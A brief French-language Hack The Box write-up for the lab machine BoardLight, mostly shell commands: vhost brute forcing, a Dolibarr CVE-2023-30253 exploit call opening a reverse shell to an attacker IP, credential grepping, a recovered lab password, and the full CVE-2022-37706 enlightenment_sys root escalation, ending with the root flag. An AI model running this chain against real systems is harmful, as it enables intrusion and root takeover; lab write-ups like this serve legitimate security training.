---
title: HTB Writeup: BoardLight
author: MiiLLIm
date: 01-06-2024
---




# HTB Writeup: BoardLight

[PWNED:Date](https://www.hackthebox.com/achievement/machine/1966580/603)

Brute force les VHOST 

```bash
gobuster vhost -u http://crm.board.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --append-domain
```

[`CVE-2023-30253`](https://github.com/nikn0laty/Exploit-for-Dolibarr-17.0.0-CVE-2023-30253/tree/main)

```bash
python3 exploit.py http://crm.board.htb login password 10.10.14.138 1234
```

Rechercher une chaîne de caractère dans un répertoire 

```bash
grep -arin 'DB_USER\|DB_PASSWORD' |awk -F':' '{print $1}' | sort | uniq -c
```

Mot de passe de Larissa trouvé : FLAG serverfun2$2023!!

## Root Flag

Trouver les fichier avec une  SUID Permission 

```bash
find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null
```

 [`CVE-2022-37706`](https://github.com/MaherAzzouzi/CVE-2022-37706-LPE-exploit) 

```bash
mkdir /tmp/net
mkdir -p "/dev/../tmp/;/tmp/exploit"
echo "/bin/bash" > /tmp/exploit
chmod a+x /tmp/exploit
/usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_sys /bin/mount -o noexec,nosuid,utf8,nodev,iocharset=utf8,utf8=0,utf8=1,uid=$(id -u), "/dev/../tmp/;/tmp/exploit" /tmp///net

```

FLAG 

```bash
root@boardlight:/home/larissa# cat /root/root.txt
8d823a6c299dff3c34c362d20335f028
```
